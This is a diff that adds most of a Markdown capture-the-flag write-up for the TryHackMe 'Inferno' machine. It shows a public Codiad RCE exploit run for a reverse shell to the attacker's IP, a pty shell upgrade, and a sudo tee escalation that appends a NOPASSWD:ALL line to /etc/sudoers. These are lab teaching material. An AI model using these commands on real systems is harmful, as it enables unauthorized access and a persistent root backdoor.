@@ -2,15 +2,21 @@
     •<a href="#enumeration">Enumeration</a>•
     <a href="#access">Access</a>•
     <a href="#foothold">Foothold</a>•
-    <a href="#privilege escalation">Privilege Escalation</a>•
+    <a href="#user">User</a>•
+    <a href="#privilege+escalation">Privilege Escalation</a>•
 </p><br>
 
 # Inferno-Writeup-Tryhackme
 Writeup of the <a href="https://tryhackme.com/room/inferno" target="_blank">Inferno</a>(made by<a href="https://tryhackme.com/p/mindsflee">@mindsflee</a>) machine on <a href="https://tryhackme.com" targer="_blank">TryHackMe</a>
 
+# Tasks
+
+1. Locate and find local.txt
+2. Locate and find proof.txt
 
 # Enumeration
-Running a rustscan on the targer gives the following result:
+
+Running a rustscan on the target gives the following result:
 <br><strong>rustscan -a 10.10.X.X -- -A -sC -sV -oN scan.txt</strong>
 
 ```
@@ -67,6 +73,7 @@ There is an interesting directory named <strong>inferno</strong>.
 But navigating to it prompts an auth box (Basic Auth).<br>
 Since we don't have any credentials bruteforce FTW!<br>
 # Access
+
 I shortlisted some possible Usernames:
 ```
 root
@@ -85,7 +92,7 @@ Using the credentials leads to another login page:<br>
 <p align="center"><img src="loginpage.png" alt="codiad">
 <br></p>
 Using the same credentials we can login.<b>Success!</b>
-<p align="center"><img src="codiad.png" height="600" width="800" alt="codiad_content"></p>
+<p align="center"><img src="codiad.png" height="500" width="600" alt="codiad_content"></p>
 
 # Foothold
 
@@ -97,3 +104,135 @@ Codiad 2.5.3 - Local File Inclusion                                             
 ```
 But it is not vulnerable to any of these exploits :( so google for the rescue. Googling "Codiad Exploit" leads us to this <a href="https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit">RCE vulnerability on Codiad</a>
 <br>
+We clone the exploit repository into our machine using git clone:
+```
+git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git
+cd Codiad-Remote-Code-Execute-Exploit/
+```
+We can run the exploit:
+```
+./exploit.py http://admin:REDACTED@10.10.X.X/inferno/ admin REDACTED <MYIP> 4444 linux
+```
+and <b>Success!</b>.We get a reverse shell:
+```
+listening on [any] 4445 ...
+connect to [MYIP] from (UNKNOWN) [10.10.X.X] 42460
+bash: cannot set terminal process group (908): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Inferno:/var/www/html/inferno/components/filemanager$ 
+```
+
+# User
+
+From the shell we are <i>www-data</i>. Not a lot of permissions but we need to pivot to another user with more permissions.<br>
+NOTE: The shell kept getting closed for some reason. I didn't know what was actually wrong. Anyway I used screen to keep the reverse shell running even when the shell is closed
+```python
+$screen -S bash
+$python3 -c 'import pty;pty.spawn("/bin/bash")'
+$export TERM=xterm256-color
+```
+Inside <i>/home/dante</i>, we see the first flag.<br>
+```
+-rw-------  1 dante dante   33 Jan 11 15:22 local.txt
+```
+But we dont have permission to read it.<br>
+Snooping around some more shows some files inside the downloads folder:
+```
+drwxr-xr-x  2 root  root     4096 Jan 11 15:29 .
+drwxr-xr-x 13 dante dante    4096 Jan 11 15:46 ..
+-rw-r--r--  1 root  root     1511 Nov  3 11:52 .download.dat
+-rwxr-xr-x  1 root  root   137440 Jan 11 15:29 CantoI.docx
+-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoII.docx
+-rwxr-xr-x  1 root  root    88280 Jan 11 15:29 CantoIII.docx
+-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoIV.docx
+-rwxr-xr-x  1 root  root   133792 Jan 11 15:29 CantoIX.docx
+-rwxr-xr-x  1 root  root    43224 Jan 11 15:22 CantoV.docx
+-rwxr-xr-x  1 root  root   133792 Jan 11 15:29 CantoVI.docx
+-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoVII.docx
+-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoX.docx
+-rwxr-xr-x  1 root  root   121432 Jan 11 15:29 CantoXI.docx
+-rwxr-xr-x  1 root  root   149080 Jan 11 15:22 CantoXII.docx
+-rwxr-xr-x  1 root  root   216256 Jan 11 15:22 CantoXIII.docx
+-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoXIV.docx
+-rwxr-xr-x  1 root  root   141528 Jan 11 15:29 CantoXIX.docx
+-rwxr-xr-x  1 root  root    88280 Jan 11 15:29 CantoXV.docx
+-rwxr-xr-x  1 root  root   137440 Jan 11 15:29 CantoXVI.docx
+-rwxr-xr-x  1 root  root   121432 Jan 11 15:29 CantoXVII.docx
+-rwxr-xr-x  1 root  root  2351792 Jan 11 15:22 CantoXVIII.docx
+-rwxr-xr-x  1 root  root    63704 Jan 11 15:29 CantoXX.docx
+```
+The <i>.download.dat</i> file looks rather interesting.
+```
+www-data@Inferno:/home/dante/Downloads$ file .download.dat 
+.download.dat: ASCII text, with very long lines, with no line terminators
+```
+Looks like it's hexadecimal:
+```
+49 66 20 79 6f 75 20 61 72 65 20 72 65 61 64 69 6e 67 20 74 68 69 73 2c 20 49 20 68 6f 70 65 20 79 6f 75 20 68 61 76 65 20 61 20 67 72 65 61 74 20 64 61 79 20 6d 79 20 66 72 69 65 6e 64 3b 29 0d 0a
+```
+Decoding it on <a href="https://www.asciitohex.com">ASCII to Hex</a> gives the following output:
+```
+«Or se’ tu quel Virgilio e quella fonte
+che spandi di parlar sì largo fiume?»,
+rispuos’io lui con vergognosa fronte.
+
+«O de li altri poeti onore e lume,
+vagliami ’l lungo studio e ’l grande amore
+che m’ha fatto cercar lo tuo volume.
+
+Tu se’ lo mio maestro e ’l mio autore,
+tu se’ solo colui da cu’ io tolsi
+lo bello stilo che m’ha fatto onore.
+
+Vedi la bestia per cu’ io mi volsi;
+aiutami da lei, famoso saggio,
+ch’ella mi fa tremar le vene e i polsi».
+
+dante:REDACTED
+```
+The line at the end are ssh credentials. <b>Great!</b>
+<br>
+```
+dante@Inferno:/home/dante$ cat local.txt
+REDACTED
+```
+First task Complete!
+
+# Privilege Escalation
+
+Running <i>sudo -l</i> gives the following result:
+```
+Matching Defaults entries for dante on Inferno:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dante may run the following commands on Inferno:
+    (root) NOPASSWD: /usr/bin/tee
+```
+Looks like <i>/usr/bin/tee</i>can be run by dante without a password.<br>
+Looking at gtfobins gives us the following <a href="https://gtfobins.github.io/gtfobins/tee/">exploit</a> for privilege escalation:
+```
+LFILE=file_to_write
+echo DATA | sudo tee -a "$LFILE"
+```
+This is really annoying me. I keep getting logged out by the system. Looking at the processes running I found the reason:
+```
+-rw-r--r--  1 root root   1778 Dec  6 14:26 machine_services1320.sh
+```
+This was the script that kept kicking me out. But I can't delete it cause it's owned by root.<br>
+
+Moving on...
+
+```bash
+dante@Inferno:~$ echo 'dante ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
+dante ALL=(ALL) NOPASSWD:ALL
+dante@Inferno:~$ sudo -i
+root@Inferno:~# ls
+proof.txt
+```
+Root at last.
+
+Second task Complete!
+
+# Conclusion
+
+This was my first writeup of anything. I hope it was good. This was a fun box. Although I got stuck at the apache login, I put thought into it and finall rooted the machine. If you have any doubts you can hit me up at @i-am-jezz. <b>Hack The Planet!</b>
